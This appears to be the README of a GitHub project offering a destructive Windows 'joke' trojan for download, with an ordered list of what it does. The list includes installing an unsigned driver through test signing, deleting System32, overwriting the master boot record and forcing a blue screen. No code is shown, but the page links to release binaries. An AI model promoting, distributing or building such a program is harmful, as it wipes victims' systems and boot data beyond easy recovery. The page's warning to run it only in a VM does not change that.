# ILOVEYUUKA Trojan
A joke trojan made in C++ for the x64 platform. Tested on Windows 10. For releasese, check here: https://github.com/arwasairl/trojan.win32.ILOVEYUUKA/releases/tag/release

# Payloads
Upon running the program, the following payloads executes in order:
* Installs custom driver for blue screen editing (sets driver testsigning to on due to unsigned driver)
* Replaces background images with sunflower
* Adds 512 copies of ILOVEYUUKA text files all with a friendly message contained within them.
* Plays Yuuka's music in the background
* Opens random Windows programs
* Opens the web browser to the Steam store page for CBT with Yuuka
* Takes ownership of System32 and deletes it
* Overwites master boot record
* Ejects C:\ drive
* Blue screens (Custom)

# Notes
* The program does not have any checks as to whether or not the program is being ran under a VM (except for Themida's packer, which allows this program to run under a VM). I advise you to not run this program under a real machine, or at least a machine you care about.

# Credits
* BSOD driver: https://github.com/ch3rn0byl/AngryWindows
